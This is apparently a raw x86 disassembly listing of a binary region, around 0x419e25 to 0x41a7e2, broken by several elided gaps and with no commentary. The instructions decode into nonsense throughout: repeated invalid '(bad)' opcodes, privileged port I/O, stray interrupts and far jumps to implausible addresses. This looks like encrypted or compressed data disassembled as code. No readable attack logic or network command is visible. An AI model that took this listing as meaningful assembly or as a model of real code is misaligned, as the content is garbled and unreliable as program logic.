  419e25:	sbb    DWORD PTR [edi],esi
  419e27:	mov    edi,0xbabf2214
  419e2c:	sbb    eax,DWORD PTR [edx+0x14]
  419e2f:	mov    ch,0x9
  419e31:	aam    0x6b
  419e33:	adc    DWORD PTR [ecx+eax*8-0x6f9b4dee],esi
  419e3a:	les    edx,FWORD PTR [edx+0x4d]
  419e3d:	mov    bh,0x7f
  419e3f:	jge    0x419ea2
  419e41:	fwait
  419e42:	mov    cl,BYTE PTR [ebx-0x407b6761]
  419e48:	push   ebp
  419e49:	cs sahf 
  419e4b:	ins    BYTE PTR es:[edi],dx
  419e4c:	xchg   eax,edx
  419e4e:	pop    ecx
  419e4f:	popa   
  419e50:	mov    eax,0x5df27647
  419e55:	in     eax,dx
  419e56:	adc    eax,0x3989e48d
  419e5b:	(bad)
  419e5e:	mov    edi,0xe8b22f23
  419e63:	jg     0x419eb4
  419e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e66:	sub    eax,0xa8e26e8d
  419e6b:	cli    
  419e6c:	sub    dl,BYTE PTR [ecx-0x11f1230b]
  419e72:	adc    al,0xc9
  419e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e75:	add    edi,ebx
  419e77:	int    0xe9
  419e79:	dec    edx
  419e7a:	dec    ebp
  419e7b:	sub    BYTE PTR [ebx+0x7d],ah
  419e7e:	std    
  419e7f:	inc    ebx
  419e80:	cdq    
  419e81:	je     0x419e6f
  419e83:	xor    ah,BYTE PTR [edx+0x15]
  419e86:	sbb    ecx,eax
  419e88:	popa   
  419e89:	xlat   BYTE PTR ds:[ebx]
  419e8a:	in     al,0x97
  419e8c:	shr    BYTE PTR [ebx-0xa],cl
  419e8f:	fld    QWORD PTR [ebp-0x72]
  419e92:	es inc ecx
  419e94:	ja     0x419ecb
  419e96:	mov    bh,0x25
  419e98:	mov    eax,0x5d505ed0
  419e9d:	test   eax,0x8367f0f7
  419ea2:	into   
  419ea3:	pushf  
  419ea4:	std    
  419ea5:	rol    DWORD PTR [esi],0x6
  419ea8:	pusha  
  419ea9:	popf   
  419eaa:	gs sahf 
  419eac:	aad    0xff
  419eae:	int3   
  419eaf:	or     al,0x62
  419eb1:	addr16 dec edi
  419eb3:	das    
  419eb4:	mov    dh,0xc2
  419eb6:	addr16 adc ebp,eax
  419eb9:	xchg   edx,eax
  419eba:	fld    QWORD PTR [ecx]
  419ebc:	mov    esp,0x217d45d4
  419ec1:	repz jle 0x419e74
  419ec4:	jle    0x419efe
  419ec6:	jecxz  0x419e59
  419ec8:	sbb    esp,edx
  419eca:	test   cl,bh
  419ecc:	ret    0x88e2
  419ecf:	mov    ch,0x50
  419ed1:	xor    DWORD PTR [ebp-0x2e],ebx
  419ed4:	adc    cl,BYTE PTR [esi]
  419ed6:	xchg   ebp,eax
  419ed7:	or     DWORD PTR fs:[esi+edx*4-0x30],0x9994dc
  419ee0:	push   ebx
  419ee1:	pop    ss
  419ee2:	push   0xffffffbf
  419ee4:	js     0x419f22
  419ee6:	jne    0x419f1e
  419ee8:	dec    ebp
  419ee9:	pop    esi
  419eea:	jecxz  0x419e83
  419eec:	rol    BYTE PTR [eax],1
	...
  419f56:	xchg   eax,ebx
  419f58:	pop    ss
  419f59:	lds    ebx,FWORD PTR [edi-0x31]
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	push   cs
  419f63:	std    
  419f64:	shr    al,0x27
  419f67:	pop    ss
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	inc    DWORD PTR [eax]
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	push   esp
  419f6f:	scas   al,BYTE PTR es:[edi]
  419f70:	cs imul eax,ecx,0x41c95b8b
  419f77:	test   DWORD PTR [edx+0x6f4605f5],0xd4e27f20
  419f81:	gs sti 
  419f83:	xor    al,0xef
  419f85:	push   0x30
  419f87:	lds    ecx,FWORD PTR [esi+edi*4]
  419f8a:	xlat   BYTE PTR ds:[ebx]
  419f8b:	(bad)  
  419f8c:	in     eax,dx
  419f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f8e:	stos   BYTE PTR es:[edi],al
  419f8f:	inc    edi
  419f90:	test   eax,0x311b76f3
  419f95:	stos   BYTE PTR es:[edi],al
  419f96:	xchg   edx,eax
  419f97:	jg     0x41a00e
  419f99:	push   0x6d
  419f9b:	push   cs
  419f9c:	adc    ah,dl
  419f9e:	hlt    
  419f9f:	adc    DWORD PTR [edx+0x61801fe4],0x6f53f27d
  419fa9:	mov    bl,0xd8
  419fab:	adc    DWORD PTR [edi],0xffffffed
  419fae:	adc    DWORD PTR [ebx],esp
  419fb0:	xchg   BYTE PTR ds:0x6ccbe325,dh
  419fb6:	cmp    DWORD PTR [edi],0x47
  419fb9:	pop    esp
  419fba:	and    DWORD PTR [eax],0xdf4f3889
  419fc0:	sbb    esi,esi
  419fc2:	xchg   edx,eax
  419fc3:	jmp    0xae88:0x5dcdc993
  419fca:	outs   dx,BYTE PTR ds:[esi]
  419fcb:	mov    edx,eax
  419fcd:	cmp    BYTE PTR ds:0x5d4cef81,ah
  419fd3:	cmp    al,0x17
  419fd5:	jae    0x419ffa
  419fd7:	mov    esp,0xe0095a6e
  419fdc:	add    al,0xb5
  419fde:	and    eax,0x288aa8ec
  419fe3:	mov    al,ds:0xae947659
  419fe8:	ins    BYTE PTR es:[edi],dx
  419fe9:	rol    BYTE PTR [ebx+esi*1-0x5e],0x57
  419fee:	fmul   QWORD PTR [esi+0x6d]
  419ff1:	xor    DWORD PTR [esi],ebp
  419ff3:	xchg   esp,eax
  419ff4:	cmp    al,0xa0
  419ff6:	cld    
  419ff7:	sbb    eax,0xb4ee8277
  419ffc:	push   0xb136f93c
  41a001:	and    BYTE PTR [ecx+0x6c],ch
  41a004:	lds    ebx,FWORD PTR [eax*4+0x4714da1c]
  41a00b:	mov    esp,0x9221fd78
  41a010:	mov    dh,ch
  41a012:	cld    
  41a013:	aad    0x7a
  41a015:	mov    al,0x23
  41a017:	xchg   ecx,eax
  41a018:	push   edi
  41a019:	iret   
  41a01a:	pop    edi
  41a01b:	push   cs
  41a01c:	mov    DWORD PTR ds:0x50885d81,ebp
  41a022:	imul   edi,DWORD PTR [esi],0x4d
  41a025:	inc    ebp
  41a026:	mov    dh,0xb1
  41a028:	sub    edi,0x69
  41a02b:	mov    edi,0xfedf669e
  41a030:	inc    edi
  41a031:	adc    bh,ah
  41a033:	jp     0x41a090
  41a035:	nop
  41a036:	int3   
  41a037:	in     eax,dx
  41a038:	jno    0x41a015
  41a03a:	mov    ch,0x11
  41a03c:	dec    edi
  41a03d:	or     ah,BYTE PTR [esi]
  41a03f:	inc    edi
  41a040:	add    eax,0x93840612
  41a045:	clc    
  41a046:	test   eax,0xeaa15af8
  41a04b:	mul    BYTE PTR [ebp+0x0]
  41a04e:	sbb    al,0x93
  41a050:	add    cl,BYTE PTR [ebx+0x59]
  41a053:	xchg   BYTE PTR [eax+0xa00f221],dh
  41a059:	add    BYTE PTR [ebp+0x6a],0xd1
  41a05d:	(bad)  
  41a05f:	cmp    BYTE PTR [ebx-0x19194bdb],bh
  41a065:	push   es
  41a066:	jle    0x41a06d
  41a068:	(bad)
  41a06b:	xchg   edx,eax
  41a06c:	loopne 0x41a06e
	...
  41a0d6:	dec    esi
  41a0d7:	jmp    0x41a103
  41a0d9:	dec    esi
  41a0da:	scas   eax,DWORD PTR es:[edi]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax-0xb],bh
  41a0e3:	ret    0xc93e
  41a0e6:	sbb    BYTE PTR es:[ecx],al
  41a0e9:	add    bh,bh
  41a0eb:	add    BYTE PTR [eax],al
  41a0ed:	add    BYTE PTR [ebx],bl
  41a0ef:	std    
  41a0f0:	lods   eax,DWORD PTR ds:[esi]
  41a0f1:	in     al,dx
  41a0f2:	iret   
  41a0f3:	adc    esp,0xffffffb1
  41a0f6:	xchg   esp,eax
  41a0f7:	fsin   
  41a0f9:	mov    ds:0xa32fc208,eax
  41a0fe:	jnp    0x41a15b
  41a100:	sbb    al,0x7a
  41a102:	and    eax,0xe1d8827f
  41a107:	add    al,0x4
  41a109:	adc    DWORD PTR [ebx+0x4b],edi
  41a10c:	test   al,0xd4
  41a10e:	idiv   DWORD PTR [edx-0x35fbe618]
  41a114:	jno    0x41a11d
  41a116:	jae    0x41a17b
  41a118:	mov    ah,BYTE PTR [ebx+0x6]
  41a11b:	add    al,0xe1
  41a11d:	pop    ebx
  41a11e:	push   ss
  41a11f:	(bad)  
  41a120:	(bad)  
  41a122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a123:	xchg   BYTE PTR [edi],bh
  41a125:	out    dx,eax
  41a126:	add    BYTE PTR [edx],al
  41a128:	jecxz  0x41a0b6
  41a12a:	adc    DWORD PTR [edi+0x34],0xffffff8d
  41a12e:	out    dx,eax
  41a12f:	add    bh,BYTE PTR [esi]
  41a131:	dec    esp
  41a132:	dec    esi
  41a133:	mov    bh,al
  41a135:	add    eax,0x43bc81ae
  41a13a:	in     eax,0xfe
  41a13c:	or     DWORD PTR [ebx-0xe],ebp
  41a13f:	ins    DWORD PTR es:[edi],dx
  41a140:	mov    ebp,0xfda518a3
  41a145:	stc    
  41a146:	imul   esp,DWORD PTR [ebx+0xf30e341],0xe8abd1e7
  41a150:	push   ds
  41a151:	and    ch,BYTE PTR [ebp-0x9]
  41a154:	pop    ebp
  41a155:	xchg   edx,eax
  41a156:	fs add al,0x64
  41a159:	sbb    DWORD PTR [ebx],esp
  41a15b:	push   esp
  41a15c:	(bad)  
  41a15d:	cld    
  41a15e:	or     cl,ch
  41a160:	loop   0x41a102
  41a162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a163:	div    DWORD PTR [ecx+0x1afd462e]
  41a169:	and    al,0x26
  41a16b:	es arpl ax,sp
  41a16e:	leave  
  41a16f:	sub    DWORD PTR [eax+0x2c2c5f30],edi
  41a175:	or     DWORD PTR [ebx+0x4],ebp
  41a178:	cdq    
  41a179:	jo     0x41a103
  41a17b:	out    dx,eax
  41a17c:	jl     0x41a1c3
  41a17e:	in     al,dx
  41a17f:	sbb    BYTE PTR [ecx+0x6f],0x34
  41a183:	rcr    DWORD PTR [esi+0x33],cl
  41a186:	cli    
  41a187:	pusha  
  41a188:	pushf  
  41a189:	mov    edi,0x5783c3d0
  41a18e:	(bad)  
  41a18f:	mov    esi,0xc36b2b7c
  41a194:	cmp    BYTE PTR [ebx],al
  41a196:	dec    ecx
  41a197:	jle    0x41a1c3
  41a199:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a19b:	add    DWORD PTR ds:0xd0e7b1de,esi
  41a1a1:	psadbw mm7,QWORD PTR [ecx+eax*2+0x2f665bf]
  41a1a9:	mov    al,ds:0x75f08ebe
  41a1ae:	cmp    ch,BYTE PTR [eax+0x51759440]
  41a1b4:	cmp    edi,esp
  41a1b6:	cmp    edi,esi
  41a1b8:	ret    
  41a1b9:	mov    dh,0xdd
  41a1bb:	dec    ebp
  41a1bc:	shr    DWORD PTR [eax],cl
  41a1be:	adc    BYTE PTR [edx+0x41153af6],cl
  41a1c4:	sbb    DWORD PTR [ecx],esp
  41a1c6:	aad    0xc4
  41a1c8:	add    al,0x1e
  41a1ca:	sbb    al,BYTE PTR [ebp+0x28]
  41a1cd:	lds    edi,FWORD PTR [ecx]
  41a1cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1d0:	rcl    DWORD PTR [esi+0x18e5687],cl
  41a1d6:	push   0x28
  41a1d8:	lods   eax,DWORD PTR ds:[esi]
  41a1d9:	in     al,dx
  41a1da:	pop    ds
  41a1db:	ins    BYTE PTR es:[edi],dx
  41a1dc:	push   ds
  41a1dd:	mov    eax,ds:0x81b39b3c
  41a1e2:	xor    dh,cl
  41a1e4:	push   0x47
  41a1e6:	loop   0x41a17c
  41a1e8:	or     ecx,DWORD PTR [ecx+0x14cd44]
	...
  41a256:	sbb    al,0xc
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	sub    al,0xbc
  41a264:	int3   
  41a265:	mov    esp,0x11925
  41a26a:	inc    DWORD PTR [eax]
  41a26c:	add    BYTE PTR [eax],al
  41a26e:	mov    esp,0x28a83324
  41a273:	sbb    ecx,DWORD PTR ds:0xcfc8d369
  41a279:	jae    0x41a265
  41a27b:	dec    edi
  41a27c:	pop    ebp
  41a27d:	lock dec edi
  41a27f:	inc    DWORD PTR [edx]
  41a281:	jae    0x41a21b
  41a283:	push   ds
  41a284:	test   DWORD PTR [bx-0x518a],ebx
  41a289:	sub    ebp,edi
  41a28b:	imul   edx,DWORD PTR [edx+0x2c],0xffffffde
  41a28f:	xchg   esi,eax
  41a290:	rcr    DWORD PTR [edi],0x53
  41a293:	rcr    DWORD PTR [ebx+0x6f],1
  41a296:	and    esi,DWORD PTR [eax*8-0xe2b94fd]
  41a29d:	retf   
  41a29e:	adc    al,0x1a
  41a2a0:	adc    dh,BYTE PTR [ebx-0x1e]
  41a2a3:	mov    eax,ds:0x392f4df1
  41a2a8:	in     eax,dx
  41a2a9:	push   edx
  41a2aa:	add    ah,BYTE PTR [eax-0x4693f98e]
  41a2b0:	sti    
  41a2b1:	xchg   esp,eax
  41a2b2:	inc    esp
  41a2b3:	and    DWORD PTR [esi+0x44],ecx
  41a2b6:	mov    gs,esi
  41a2b8:	out    dx,al
  41a2b9:	test   BYTE PTR [eax-0x28],0xa1
  41a2bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2be:	cwde   
  41a2bf:	in     eax,dx
  41a2c0:	pop    esp
  41a2c1:	add    ecx,DWORD PTR [ecx-0x7a]
  41a2c4:	mov    ds:0x294a9056,al
  41a2c9:	add    eax,0xde33ed7a
  41a2ce:	mov    ebx,0x83dccea2
  41a2d3:	stos   DWORD PTR es:[edi],eax
  41a2d4:	push   ds
  41a2d5:	jl     0x41a2a4
  41a2d7:	mov    bl,0xbd
  41a2d9:	sub    BYTE PTR [eax-0x75],0x3
  41a2dd:	mov    esi,0x7c83300f
  41a2e2:	sub    DWORD PTR [ebx+0x49b5871b],0xffffffe4
  41a2e9:	push   0xffffffd0
  41a2eb:	mov    eax,esp
  41a2ed:	sbb    BYTE PTR [edi+eiz*2-0x4f],ah
  41a2f1:	aaa    
  41a2f2:	sbb    ebp,esp
  41a2f4:	or     edi,DWORD PTR [eax+0x442177f9]
  41a2fa:	test   DWORD PTR [edx],ebp
  41a2fc:	sub    edi,DWORD PTR [edx-0x24]
  41a2ff:	sbb    eax,0xe8a0f8d6
  41a304:	pop    ebx
  41a305:	in     al,dx
  41a306:	mov    dl,0x36
  41a308:	mov    DWORD PTR [esi+eiz*8+0x16],esi
  41a30c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a30d:	neg    DWORD PTR es:[ebx]
  41a310:	das    
  41a311:	push   ebx
  41a312:	(bad)  
  41a313:	outs   dx,BYTE PTR ds:[esi]
  41a314:	jmp    0x7f02afd1
  41a319:	test   DWORD PTR [esi+0x5d9cda83],ebp
  41a31f:	popa   
  41a320:	dec    ebp
  41a321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a322:	ret    
  41a323:	fucomi st,st(7)
  41a325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a326:	jmp    FWORD PTR [ecx-0x194f4249]
  41a32c:	mov    al,0xbd
  41a32e:	mov    al,ds:0xcfa26fbf
  41a333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a334:	es mov ebp,0x6bd081f7
  41a33a:	jae    0x41a3b8
  41a33c:	xor    DWORD PTR [esi+0x39079a60],ebx
  41a342:	xchg   DWORD PTR [eax+0x6],ebx
  41a345:	ins    BYTE PTR es:[edi],dx
  41a346:	and    DWORD PTR [ecx-0x28a05996],edx
  41a34c:	dec    ebx
  41a34d:	icebp  
  41a34e:	aam    0xec
  41a350:	or     al,0x29
  41a352:	jno    0x41a2f7
  41a354:	or     DWORD PTR [ebx-0x73ac078a],esi
  41a35a:	imul   BYTE PTR [edi+eiz*8+0x6b230002]
  41a361:	cmc    
  41a362:	aad    0x85
  41a364:	popf   
  41a365:	fmul   QWORD PTR [ebp+eax*1+0x5b6ec429]
  41a36c:	icebp  
	...
  41a3d5:	add    bh,dh
  41a3d7:	pop    eax
  41a3d8:	test   al,0x13
  41a3da:	scas   eax,DWORD PTR es:[edi]
  41a3db:	repz (bad) 
  41a3dd:	cld    
  41a3de:	adc    eax,0xe1a6955c
  41a3e3:	ror    BYTE PTR [edx-0x6b],0x24
  41a3e7:	sbb    al,BYTE PTR [ecx]
  41a3e9:	add    bh,bh
  41a3eb:	add    BYTE PTR [eax],al
  41a3ed:	add    cl,al
  41a3ef:	xor    BYTE PTR [ebp-0x2c],ch
  41a3f2:	out    dx,eax
  41a3f3:	pop    esp
  41a3f4:	inc    esp
  41a3f5:	xchg   DWORD PTR [ebp+0x704a3ed7],edi
  41a3fb:	adc    esi,DWORD PTR [ebx-0x2ace909b]
  41a401:	adc    BYTE PTR [eax+0x28],dh
  41a404:	or     edi,DWORD PTR [eax+eax*8]
  41a407:	mov    esp,0x3a91387c
  41a40c:	dec    ebp
  41a40d:	shr    edx,cl
  41a40f:	je     0x41a41a
  41a411:	mov    DWORD PTR [edi+ebp*8+0x18],eax
  41a415:	les    ebp,FWORD PTR [ecx-0x1f31aaf5]
  41a41b:	lods   al,BYTE PTR ds:[esi]
  41a41c:	retf   0xd108
  41a41f:	pop    eax
  41a420:	xchg   BYTE PTR [edi+ebp*8-0x47f879f3],bl
  41a427:	xchg   esp,eax
  41a428:	jne    0x41a468
  41a42a:	lods   eax,DWORD PTR ds:[esi]
  41a42b:	xchg   esp,eax
  41a42c:	add    bl,dh
  41a42e:	pop    esp
  41a42f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a430:	xchg   esp,eax
  41a431:	dec    eax
  41a432:	xor    al,0xf6
  41a434:	pop    ds
  41a435:	scas   eax,DWORD PTR es:[edi]
  41a436:	sti    
  41a437:	idiv   al
  41a439:	jbe    0x41a3d7
  41a43b:	cmp    ebx,DWORD PTR [esi]
  41a43d:	mov    eax,ds:0x78a3feee
  41a442:	test   DWORD PTR [ebx+ebp*2-0x639e3107],ebx
  41a449:	fstp   QWORD PTR [eax+0x1266c178]
  41a44f:	ds sti 
  41a451:	sbb    DWORD PTR [ecx],ecx
  41a453:	sbb    BYTE PTR [edx],al
  41a455:	jg     0x41a4a2
  41a457:	and    edx,edx
  41a459:	and    dh,BYTE PTR [ebp+0x50494256]
  41a45f:	outs   dx,BYTE PTR ds:[esi]
  41a460:	push   cs
  41a461:	push   ebp
  41a462:	icebp  
  41a463:	adc    DWORD PTR [ecx],esp
  41a465:	mov    esi,0x48642547
  41a46a:	mov    eax,0x4b2b5982
  41a46f:	lock mov esi,0x4ed9b6e8
  41a475:	add    al,0x11
  41a477:	arpl   WORD PTR gs:[ebx+ebx*2-0x8],bp
  41a47c:	loope  0x41a43e
  41a47e:	shl    DWORD PTR [eax-0x7d621e78],1
  41a484:	jae    0x41a40d
  41a486:	adc    ecx,DWORD PTR [esi+ebx*2]
  41a489:	adc    ah,BYTE PTR [eax+0x33]
  41a48c:	or     ecx,DWORD PTR [esi-0x14]
  41a48f:	scas   al,BYTE PTR es:[edi]
  41a490:	imul   esp,DWORD PTR [edx-0xb],0xe
  41a494:	fs cs (bad) 
  41a497:	in     eax,dx
  41a498:	bound  ebx,QWORD PTR [ecx]
  41a49a:	dec    esp
  41a49b:	call   0xefd4:0x5abbce57
  41a4a2:	out    0x91,eax
  41a4a4:	shr    BYTE PTR [edx+0x3ba3149b],1
  41a4aa:	jno    0x41a473
  41a4ac:	pop    ebx
  41a4ad:	bound  edx,QWORD PTR [edi+0x56]
  41a4b0:	jns    0x41a512
  41a4b2:	cmc    
  41a4b3:	add    edx,eax
  41a4b5:	sub    eax,0x557b057
  41a4ba:	jmp    0x8fc6a78c
  41a4bf:	pop    ecx
  41a4c0:	push   es
  41a4c1:	in     al,dx
  41a4c2:	pop    edi
  41a4c3:	dec    edi
  41a4c4:	aad    0x30
  41a4c6:	js     0x41a53b
  41a4c8:	push   0x1cce6903
  41a4cd:	adc    BYTE PTR ds:0x27ca4bc7,bh
  41a4d3:	pop    ecx
  41a4d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4d5:	dec    ebp
  41a4d6:	jmp    0x500b3788
  41a4db:	and    eax,0x1c16f474
  41a4e0:	or     DWORD PTR [ebx+edi*1-0x5276724f],0xfffffffa
  41a4e8:	cmp    dl,BYTE PTR [ebx-0x52]
  41a4eb:	push   esi
  41a4ec:	js     0x41a4ee
	...
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	leave  
  41a563:	test   BYTE PTR [esi],0x21
  41a566:	and    ebx,DWORD PTR [ebx]
  41a568:	add    DWORD PTR [eax],eax
  41a56a:	inc    DWORD PTR [eax]
  41a56c:	add    BYTE PTR [eax],al
  41a56e:	jle    0x41a51f
  41a570:	push   ecx
  41a571:	xchg   ebx,eax
  41a572:	shl    al,0x15
  41a575:	fnsave ds:0x939cad11
  41a57b:	inc    ebp
  41a57c:	fst    DWORD PTR [eax+0x7d]
  41a57f:	pop    esp
  41a580:	mov    esi,0x9b35665c
  41a585:	add    eax,0xb1cbe850
  41a58a:	inc    eax
  41a58b:	xor    al,BYTE PTR [esi+0x41c92ca0]
  41a591:	pop    ecx
  41a592:	stos   BYTE PTR es:[edi],al
  41a593:	sbb    BYTE PTR [ecx+0x4c],bl
  41a596:	push   ds
  41a597:	jne    0x41a561
  41a599:	imul   esi,edx,0x3d
  41a59c:	mov    esi,0x2bbc5d0
  41a5a1:	dec    ecx
  41a5a2:	xchg   ecx,eax
  41a5a3:	sbb    edi,esp
  41a5a5:	dec    edx
  41a5a6:	inc    esi
  41a5a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5a8:	push   es
  41a5a9:	in     al,0x43
  41a5ab:	sub    BYTE PTR [ebp-0x16],0xab
  41a5af:	scas   al,BYTE PTR es:[edi]
  41a5b0:	into   
  41a5b1:	mov    bh,0xc6
  41a5b3:	call   0x9da033df
  41a5b8:	cmp    al,0x2f
  41a5ba:	xor    al,ch
  41a5bc:	mov    ch,0xc8
  41a5be:	push   eax
  41a5bf:	cmc    
  41a5c0:	push   esp
  41a5c1:	mov    ecx,0xa1548b93
  41a5c6:	mov    dh,BYTE PTR [ebx+0x5d]
  41a5c9:	outs   dx,BYTE PTR ds:[esi]
  41a5ca:	fwait
  41a5cb:	les    esi,FWORD PTR [edi]
  41a5cd:	retf   0x2303
  41a5d0:	sbb    ebx,0x21
  41a5d3:	cdq    
  41a5d4:	imul   ecx,DWORD PTR ds:0xcd8ca8e5,0x99ad4a2e
  41a5de:	xabort 0x5a
  41a5e1:	sbb    ah,ah
  41a5e3:	sub    al,0xe0
  41a5e5:	stos   DWORD PTR es:[edi],eax
  41a5e6:	mov    esi,0x5edce734
  41a5eb:	xor    ah,BYTE PTR [edi]
  41a5ed:	xchg   ebx,eax
  41a5ee:	pusha  
  41a5ef:	pop    ebx
  41a5f0:	jmp    0x41a5a5
  41a5f2:	mov    dh,0x32
  41a5f4:	dec    esi
  41a5f5:	(bad)  
  41a5f6:	aad    0x26
  41a5f8:	jge    0x41a5ff
  41a5fa:	mov    edi,0x6d06a58b
  41a5ff:	sub    BYTE PTR [esi-0x7b0d6eb6],dl
  41a605:	jne    0x41a664
  41a607:	cmp    BYTE PTR [ecx],dl
  41a609:	inc    edi
  41a60a:	push   ebx
  41a60b:	sub    edx,edi
  41a60d:	mov    al,ds:0x8f4965e7
  41a612:	inc    eax
  41a613:	out    dx,al
  41a614:	mov    DWORD PTR [ebp+0x4f717019],ebx
  41a61a:	repz test al,0xcd
  41a61d:	lock push 0x26
  41a620:	stos   DWORD PTR es:[edi],eax
  41a621:	call   DWORD PTR [esi-0x1ec6aaba]
  41a627:	xchg   BYTE PTR [esi-0xa],bl
  41a62a:	mov    esp,0xc71b5315
  41a62f:	pop    edi
  41a630:	rol    BYTE PTR ds:0xa79e081b,cl
  41a636:	cmova  ebx,ecx
  41a639:	test   eax,0x639bd961
  41a63e:	jo     0x41a6a8
  41a640:	rep lods al,BYTE PTR ds:[esi]
  41a642:	jmp    0x40030e8b
  41a647:	hlt    
  41a648:	push   edx
  41a649:	xchg   edx,eax
  41a64a:	xor    al,0xe7
  41a64c:	loop   0x41a5fc
  41a64e:	jmp    0x7f520e7a
  41a653:	push   esp
  41a654:	fwait
  41a655:	push   ebp
  41a656:	xchg   esi,eax
  41a657:	add    DWORD PTR [ecx+edi*8],eax
  41a65a:	add    al,ch
  41a65c:	mov    esp,0x36777635
  41a661:	jnp    0x41a69a
  41a663:	test   BYTE PTR [edi+0x6ac41710],bh
  41a669:	sub    bl,ch
  41a66b:	cmp    ebp,DWORD PTR [ebx]
	...
  41a6d5:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0xc61ca625
  41a6e4:	mov    ch,0x9c
  41a6e6:	and    bl,BYTE PTR [ecx+eax*1]
  41a6e9:	add    bh,bh
  41a6eb:	add    BYTE PTR [eax],al
  41a6ed:	add    ah,ah
  41a6ef:	aaa    
  41a6f0:	in     eax,dx
  41a6f1:	mov    ds:0xd2988488,al
  41a6f6:	aam    0xf
  41a6f8:	or     al,0x11
  41a6fa:	enter  0x9177,0x11
  41a6fe:	push   es
  41a6ff:	std    
  41a700:	fwait
  41a701:	mov    eax,ds:0x8355e9ae
  41a706:	cmp    DWORD PTR [ecx-0x1dce17d],0x77
  41a70d:	fstp   DWORD PTR [ecx]
  41a70f:	mov    dl,0x2e
  41a711:	mov    edx,0xf9dee30c
  41a716:	(bad)  
  41a717:	push   ss
  41a718:	cmp    BYTE PTR [edx+esi*1],bh
  41a71b:	mov    ds:0x58162084,eax
  41a720:	loop   0x41a76d
  41a722:	pop    esi
  41a723:	jge    0x41a6e3
  41a725:	(bad)  
  41a726:	adc    BYTE PTR [edi-0x66],cl
  41a729:	and    DWORD PTR [edx+edi*1+0x2ac95312],0xdb34c96
  41a734:	mov    bl,0xf6
  41a736:	mov    bl,0xe5
  41a738:	int3   
  41a739:	addr16 jno 0x41a782
  41a73c:	stos   BYTE PTR es:[edi],al
  41a73d:	mov    edx,ebx
  41a73f:	xor    dl,BYTE PTR [ecx]
  41a741:	jle    0x41a782
  41a743:	popa   
  41a744:	pop    ecx
  41a745:	and    al,0x5d
  41a747:	or     BYTE PTR [edi],ah
  41a749:	cmp    DWORD PTR [edx+0x7f],ebx
  41a74c:	mov    ch,0x9e
  41a74e:	idiv   DWORD PTR [edx]
  41a750:	hlt    
  41a751:	jmp    0x41a6d4
  41a753:	(bad)  
  41a754:	mov    ds:0x61fdbcfb,eax
  41a759:	dec    esi
  41a75a:	ds cmc 
  41a75c:	pop    es
  41a75d:	sti    
  41a75e:	es dec ecx
  41a760:	adc    DWORD PTR [esi-0x46],ebp
  41a763:	scas   ax,WORD PTR es:[edi]
  41a765:	jnp    0x41a7d2
  41a767:	das    
  41a768:	sbb    edx,DWORD PTR [ebx]
  41a76a:	inc    edx
  41a76b:	repz and bl,dl
  41a76e:	pop    ss
  41a76f:	jbe    0x41a739
  41a771:	jecxz  0x41a702
  41a773:	dec    eax
  41a774:	pop    eax
  41a775:	arpl   WORD PTR [edi+0x2b070c06],cx
  41a77b:	push   edi
  41a77c:	fnsetpm(287 only) 
  41a77e:	adc    bl,dh
  41a780:	(bad)  
  41a781:	mov    ebx,0xe1643840
  41a786:	(bad)  [ebx-0x2cecbb72]
  41a78c:	xor    BYTE PTR [ebx],al
  41a78e:	sub    eax,0xa4b6ef87
  41a793:	jae    0x41a72f
  41a795:	mov    WORD PTR [edx-0x6ba39a33],?
  41a79b:	inc    eax
  41a79c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a79d:	(bad)  
  41a79f:	push   eax
  41a7a0:	dec    edi
  41a7a1:	adc    BYTE PTR [esi],dh
  41a7a3:	out    0x5f,eax
  41a7a5:	les    eax,FWORD PTR [ebp-0x46]
  41a7a8:	dec    ecx
  41a7a9:	mov    al,bl
  41a7ab:	popa   
  41a7ac:	and    esi,DWORD PTR [ebp+ebx*2+0x4f10717e]
  41a7b3:	push   0xffffff94
  41a7b5:	or     dh,BYTE PTR [edx-0x2b]
  41a7b8:	xor    dh,BYTE PTR [ebp+0x51]
  41a7bb:	mov    es,ebp
  41a7bd:	and    BYTE PTR [edx-0x2],0xac
  41a7c1:	add    ah,bh
  41a7c3:	(bad)  
  41a7c4:	cmp    dl,bh
  41a7c6:	dec    esi
  41a7c7:	xchg   ebp,eax
  41a7c8:	sbb    al,0x2d
  41a7ca:	jl     0x41a7fa
  41a7cc:	dec    ebx
  41a7cd:	or     BYTE PTR fs:[esi],0xf7
  41a7d1:	mov    al,ds:0x6fbc6984
  41a7d6:	cld    
  41a7d7:	aad    0x26
  41a7d9:	ficom  WORD PTR [ecx-0x48]
  41a7dc:	femms  
  41a7de:	sbb    bh,BYTE PTR [edx+ebp*4-0x47]
  41a7e2:	cwde   
